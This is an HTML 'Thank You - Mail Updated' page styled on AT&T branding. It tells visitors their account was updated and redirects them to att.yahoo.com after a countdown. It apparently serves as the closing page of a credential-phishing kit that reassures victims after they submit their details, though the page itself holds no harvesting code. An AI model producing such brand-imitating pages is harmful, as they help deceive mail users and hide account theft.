<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Thank You - Mail Updated</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Styling for AT&T-inspired theme */
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f4f6;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .thank-you-container {
            text-align: center;
            background-color: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-top: 6px solid #00a4ef;
        }

        /* Animation for each letter in Thank You */
        .letter {
            font-size: 3em;
            color: #00a4ef;
            display: inline-block;
            opacity: 0;
            transform: translateY(-20px);
            animation: fadeIn 0.5s ease forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        p {
            font-size: 1.2em;
            margin: 20px 0;
        }

        #countdown {
            font-weight: bold;
            color: #ff6f61;
        }

        .balloon {
            font-size: 3em;
            margin-top: 20px;
            color: #ff6f61;
        }
    </style>
    <script>
        let countdown = 5;

        function startCountdown() {
            const countdownDisplay = document.getElementById('countdown');
            const interval = setInterval(() => {
                countdownDisplay.textContent = countdown;
                countdown--;

                if (countdown < 0) {
                    clearInterval(interval);
                    window.location.href = "https://att.yahoo.com";
                }
            }, 1000);
        }

        function animateThankYou() {
            const letters = document.querySelectorAll('.letter');
            letters.forEach((letter, index) => {
                letter.style.animationDelay = `${index * 0.5}s`;
            });
        }

        window.onload = () => {
            animateThankYou();
            startCountdown();
        };
    </script>
</head>
<body>
    <div class="thank-you-container">
        <h1>
            <span class="letter">T</span>
            <span class="letter">h</span>
            <span class="letter">a</span>
            <span class="letter">n</span>
            <span class="letter">k</span>
            <span> </span>
            <span class="letter">Y</span>
            <span class="letter">o</span>
            <span class="letter">u</span>
            <span class="letter">!</span>
        </h1>
        <p>Your account has been updated successfully. You will be redirected to <strong>AT&T</strong> in <span id="countdown">5</span> seconds.</p>
        <div class="balloon">ðŸŽˆ</div>
    </div>
</body>
</html>
